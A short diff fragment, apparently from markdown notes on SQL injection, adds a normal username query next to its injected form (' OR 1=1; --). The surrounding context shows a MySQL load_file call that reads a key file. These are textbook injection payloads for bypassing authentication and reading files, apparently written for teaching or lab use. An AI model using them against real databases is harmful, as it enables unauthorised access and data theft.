@@ -35,3 +35,11 @@ select load_file('/var/lib/mysql-files/key.txt');
 ' 1 or 1=1 #'
 ```
 
+```
+SELECT * FROM users WHERE username = 'input' LIMIT 1;
+```
+
+```
+SELECT * FROM users WHERE username = '' OR 1=1; --' LIMIT 1;
+```
+
